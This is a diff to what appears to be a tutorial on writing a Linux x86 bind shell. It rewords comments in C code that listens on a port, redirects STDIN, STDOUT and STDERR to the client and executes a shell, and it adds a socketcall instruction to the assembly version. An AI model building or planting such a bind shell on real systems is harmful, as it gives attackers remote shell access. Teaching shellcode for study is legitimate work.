@@ -61,7 +61,7 @@ int main()
     // 3rd syscall - listen for incoming connections  
     listen(host_sockid, 2);  
   
-    // 4th syscall - accept incoming connections using the socket created  
+    // 4th syscall - accept incoming connections using the created socket   
     client_sockid = accept(host_sockid, NULL, NULL);  
   
     // 5th syscall - duplicate file descriptors for STDIN, STDOUT and STDERR  
@@ -131,7 +131,7 @@ The C code achieves the following objectives:
 * Creates a socket
 * Binds the socket to a port
 * Configures the socket to listen for incoming connections
-* Accepts connections on the newly created socket
+* Accepts connections on the created socket
 * Redirects STDIN, STDOUT, and STDERR to the incoming client connection
 * Executes a shell
 
@@ -167,6 +167,7 @@ Next step is to create the socket syscall
 
 ```nasm
 ; 1st syscall - create socket
+mov al, 0x66    ;
 mov bl, 2       ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h
 mov cl, 1       ; setting up SOCK_STREAM, as seen in C code and pulled from /usr/include/i386-linux-gnu/bits/socket_type.h
 mov dl, 6       ; setting protocol again as in C code, pulled from /usr/include/linux/netinet/in.h
